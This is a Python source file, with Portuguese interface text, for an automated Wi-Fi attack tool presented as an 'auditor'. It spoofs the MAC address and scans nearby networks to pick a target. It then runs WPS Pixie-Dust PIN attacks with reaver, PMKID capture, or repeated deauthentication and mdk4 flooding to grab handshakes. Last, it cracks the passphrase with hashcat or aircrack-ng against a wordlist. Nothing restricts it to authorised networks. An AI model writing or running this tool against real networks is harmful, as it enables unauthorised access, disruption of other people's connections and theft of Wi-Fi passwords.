import subprocess
import os
import time
import csv
import json
import threading
from datetime import datetime

# ==============================================================
# UI MODERNA - GRÃO-MESTRE EDITION (CYBERPUNK)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] O módulo 'rich' não foi encontrado. Execute ./run_auditor.sh.")
    exit(1)

console = Console()

OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link", "18:D6:C7": "TP-Link", "D8:47:32": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
    "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "D0:D3:E0": "Cisco",
    "00:0C:42": "MikroTik", "E8:48:B8": "MikroTik", "48:8F:5A": "MikroTik", "64:D1:54": "MikroTik",
    "00:14:6C": "Netgear", "20:4E:7F": "Netgear", "BC:EE:7B": "Netgear", "00:24:D1": "D-Link",
    "FC:22:F4": "Zyxel", "00:19:CB": "Zyxel", "D0:54:2D": "Zyxel", "A4:91:B1": "Intelbras"
}

def identify_vendor(bssid):
    prefix = bssid.upper()[:8]
    return OUI_DB.get(prefix, "Desconhecido/Genérico")

def analyze_vulnerabilities(vendor, essid, privacy):
    vulns, advice = [], ""
    if "Starlink" in vendor or "Starlink" in essid:
        advice = "ALVO DE ALTA SEGURANÇA. PMF (802.11w) provavelmente ATIVO. Deauth comum irá falhar. Tente PMKID prolongado ou MDK4 EAPOL Flood."
        vulns.append("PMF Detected")
    elif "TP-Link" in vendor:
        advice = "Vulnerabilidade WPS (Pixie-Dust) detectada frequentemente. Recomendado Ataque de PIN."
        vulns.append("WPS Potential")
    else:
        advice = "Vetor Híbrido: PMKID + Deauth Broadcast."
    return vulns, advice

def fix_drivers_wifi6():
    console.print(Panel("[bold yellow]Iniciando Diagnóstico de Drivers Wi-Fi 6...[/bold yellow]", title="WIFI 6 DOCTOR"))
    stdout_usb, _ = run_command("lsusb")
    chipset = None
    if "8852" in stdout_usb: chipset = "RTL8852AU"
    elif "8832" in stdout_usb: chipset = "RTL8832AU"
    elif "7921" in stdout_usb: chipset = "MT7921AU"
    if not chipset:
        console.print("[bold red]Nenhum chipset Wi-Fi 6 conhecido detectado via USB.[/bold red]")
        console.print("Dica: Verifique se a placa está bem conectada ou use outra porta USB 3.0.")
        return False
    console.print(f"[bold green]Chipset Detectado: {chipset}[/bold green]")
    if Confirm.ask(f"Deseja tentar instalar drivers automáticos para {chipset}?"):
        with console.status("[bold cyan]Instalando componentes táticos...", spinner="dots"):
            if "RTL" in chipset:
                run_command("apt update && apt install -y build-essential git dkms raspberrypi-kernel-headers", sudo=True)
                run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/rtl8852au", sudo=True)
                run_command("cd /tmp/rtl8852au && make && make install", sudo=True)
            elif "MT" in chipset:
                run_command("apt update && apt install -y firmware-libertas", sudo=True)
        console.print("[bold green]Instalação finalizada. Reinicie o sistema.[/bold green]")
        return True
    return False

def print_banner():
    banner = """
[bold cyan]██████╗ ███████╗██╗     ██████╗ ██████╗  █████╗  ██████╗ [/bold cyan]
[bold cyan]██╔══██╗██╔════╝██║    ██╔════╝ ██╔══██╗██╔══██╗██╔═══██╗[/bold cyan]
[bold blue]██║  ██║███████╗██║    ██║  ███╗██████╔╝███████║██║   ██║[/bold blue]
[bold blue]██║  ██║╚════██║██║    ██║   ██║██╔══██╗██╔══██║██║   ██║[/bold blue]
[bold magenta]██████╔╝███████║██║    ╚██████╔╝██║  ██║██║  ██║╚██████╔╝[/bold magenta]
[bold magenta]╚═════╝ ╚══════╝╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ [/bold magenta]
[bold white]       G R Ã O - M E S T R E   I N F A L Í V E L     [/bold white]
    """
    console.print(Panel(banner, title="[bold red]SUPREME SYSTEM ONLINE[/bold red]", border_style="cyan", padding=(1, 2)))

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo: command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.CalledProcessError as e: return None, e.stderr.strip()

def check_aircrack_ng():
    with console.status("[bold yellow]Inspecionando Arsenal Grão-Mestre...", spinner="bouncingBar"):
        ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "bully"]
        todas_instaladas = True
        for ferramenta in ferramentas:
            stdout, _ = run_command(f"dpkg -s {ferramenta}")
            if not (stdout and "install ok installed" in stdout): todas_instaladas = False
    if todas_instaladas: return True
    if Confirm.ask("[bold yellow]Arsenal Suprems incompleto. Instalar agora?[/bold yellow]"):
        run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools mdk4 macchanger reaver bully", sudo=True)
        return True
    return False

def show_manual():
    manual_path = "manual_auditoria_wifi.md"
    if os.path.exists(manual_path):
        with open(manual_path, "r", encoding="utf-8") as f:
            console.print(Panel(f.read(), title="[bold yellow]MANUAL SUPREMO[/bold yellow]", border_style="yellow"))
    Prompt.ask("\n[bold cyan]ENTER para voltar...[/bold cyan]")

def save_networks_log(networks):
    log_file = "redes_identificadas_log.json"
    try:
        todas = []
        if os.path.exists(log_file):
             with open(log_file, "r", encoding="utf-8") as f:
                  try: todas = json.load(f)
                  except: pass
        todas.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "redes": networks})
        with open(log_file, "w", encoding="utf-8") as f: json.dump(todas, f, indent=4, ensure_ascii=False)
    except Exception: pass

def get_wifi_interface():
    stdout, _ = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    if stdout:
        interfaces = stdout.split('\n')
        table = Table(title="HARDWARE DETECTADO")
        table.add_column("ID"); table.add_column("Nome")
        for i, iface in enumerate(interfaces): table.add_row(str(i + 1), iface)
        console.print(table)
        choice = IntPrompt.ask("Selecione ID", choices=[str(i+1) for i in range(len(interfaces))])
        return interfaces[choice - 1]
    return None

def set_monitor_mode(interface):
    stdout_check, _ = run_command(f"iw dev {interface} info")
    if stdout_check and "type monitor" in stdout_check: return interface
    with console.status("[bold red]Blindagem e Camuflagem MAC...", spinner="bouncingBar"):
        run_command("rfkill unblock all", sudo=True)
        run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
        run_command("airmon-ng check kill", sudo=True)
        run_command(f"ip link set {interface} down", sudo=True)
        run_command(f"macchanger -r {interface}", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        run_command("iw dev | grep mon | awk '{print $2}' | xargs -I {} iw dev {} del", sudo=True)
        run_command(f"airmon-ng start {interface}", sudo=True)
        stdout_iw, _ = run_command("iw dev")
    for line in stdout_iw.split('\n'):
        if "Interface" in line: current = line.split()[1]
        elif "type monitor" in line and current: return current
    return interface

def set_managed_mode(interface):
    with console.status("[bold yellow]Restaurando Serviços...", spinner="dots2"):
        run_command(f"airmon-ng stop {interface}", sudo=True)
        run_command(f"ip link set {interface} down", sudo=True)
        run_command(f"macchanger -p {interface}", sudo=True)
        run_command(f"iw dev {interface} set type managed", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
        run_command("nmcli networking on", sudo=True)

def scan_networks(monitor_interface):
    console.print(Panel(f"RADAR ATIVO EM {monitor_interface}", border_style="magenta"))
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")
    try: subprocess.run(f"sudo airodump-ng --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
    except KeyboardInterrupt: pass
    networks = []
    csv_file = f"{output_prefix}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f); in_ap = False
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if row[0].strip() == "Station MAC": break
                if in_ap:
                    bssid = row[0].strip(); essid = row[13].strip()
                    if essid and essid != "\x00":
                        networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
    if not networks: return None
    table = Table(title="MAPA DE ALVOS")
    table.add_column("ID"); table.add_column("Fabricante"); table.add_column("ESSID")
    table.add_column("BSSID"); table.add_column("CH"); table.add_column("ENC")
    for i, net in enumerate(networks): table.add_row(str(i + 1), net['vendor'], net['essid'], net['bssid'], net['channel'], net['privacy'])
    console.print(table)
    choice = IntPrompt.ask("Escolha Alvo (ID)", choices=[str(i+1) for i in range(len(networks))])
    target = networks[choice - 1]
    _, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
    console.print(Panel(f"INTELIGÊNCIA: {advice}", title="ANÁLISE SUPREMA", border_style="green"))
    console.print("[1] Deauth Magistrado\n[2] PMKID Stealth\n[3] WPS Pixie-Dust")
    atk_c = Prompt.ask("Vetor", choices=["1", "2", "3"], default="2")
    target['attack_type'] = 'wps' if atk_c == '3' else ('pmkid' if atk_c == '2' else 'handshake')
    return target

def capture_wps(monitor_interface, bssid, channel):
    console.print(Panel(f"Iniciando Incursão WPS Pixie-Dust...", border_style="magenta"))
    cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        if "WPS PIN" in result.stdout or "WPA PSK" in result.stdout:
            console.print("[bold green] [✔] SUCESSO![/bold green]")
            return True
    except: pass
    return False

def capture_pmkid(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"Iniciando Extração PMKID...", border_style="red"))
    pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    filtro = "alvo_filtro.txt"
    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
    dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
    with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
        task = progress.add_task("Varredura profunda...", total=60)
        proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        for _ in range(60):
            time.sleep(1); progress.update(task, advance=1)
        proc.terminate()
    os.remove(filtro)
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0:
            return hashf
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"Iniciando Deauth Magistrado...", border_style="yellow"))
    os.system(f"rm -f {output_file}-01.*")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap_file = f"{output_file}-01.cap"; handshake_found = False
    for attempt in range(1, 5):
        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 10 -a {bssid} {monitor_interface}"
        elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
        elif attempt == 3: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"
        else: deauth_cmd = f"sudo mdk4 {monitor_interface} m -t {bssid}"
        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with Progress(SpinnerColumn("dots"), TextColumn("[bold yellow]Vigiando chaves..."), BarColumn(), TimeRemainingColumn()) as progress:
            task = progress.add_task("", total=30)
            for _ in range(30):
                time.sleep(1); progress.update(task, advance=1)
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                    stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                    if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
        if handshake_found: break
    dump_proc.terminate(); return cap_file if handshake_found else None

def main():
    if os.geteuid() != 0: return
    while True:
        os.system("clear"); print_banner()
        console.print("\n[bold cyan]1.[/bold cyan] Incursão Grão-Mestre\n[bold cyan]2.[/bold cyan] Diagnóstico de Placa Wi-Fi 6\n[bold cyan]3.[/bold cyan] Info\n[bold cyan]4.[/bold cyan] Sair")
        opcao = Prompt.ask("\n[bold green]Ação[/bold green]", choices=["1", "2", "3", "4"])
        if opcao == '3': show_manual(); continue
        elif opcao == '4': return
        elif opcao == '2': fix_drivers_wifi6(); Prompt.ask("\nENTER para voltar..."); continue
        elif opcao == '1': break
    if not check_aircrack_ng(): return
    interface = get_wifi_interface()
    if not interface: return
    monitor_interface = set_monitor_mode(interface)
    if not monitor_interface: return
    try:
        target = scan_networks(monitor_interface)
        if not target: return
        if target['attack_type'] == 'wps':
            if capture_wps(monitor_interface, target['bssid'], target['channel']): return
        prefix = f"capture_{target['essid'].replace(' ', '_')}"
        if target['attack_type'] == 'pmkid':
             cap_file = capture_pmkid(monitor_interface, target['bssid'], target['channel'], prefix)
             if not cap_file: cap_file = capture_handshake(monitor_interface, target['bssid'], target['channel'], prefix)
        else: cap_file = capture_handshake(monitor_interface, target['bssid'], target['channel'], prefix)
        if not cap_file: console.print(Panel("[bold red]Alvo resistiu.[/bold red]")); return
        wordlist = Prompt.ask("\nWordlist", default="/usr/share/wordlists/rockyou.txt")
        crack_hash(cap_file, wordlist, target['bssid'])
    except KeyboardInterrupt: pass
    finally: set_managed_mode(monitor_interface)

def crack_hash(hash_file, wordlist_file, bssid=None):
    if not os.path.exists(wordlist_file): return
    if hash_file.endswith(".16800"): crack_cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}"
    else: crack_cmd = f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
    try: subprocess.run(crack_cmd, shell=True)
    except: pass

if __name__ == "__main__": main()
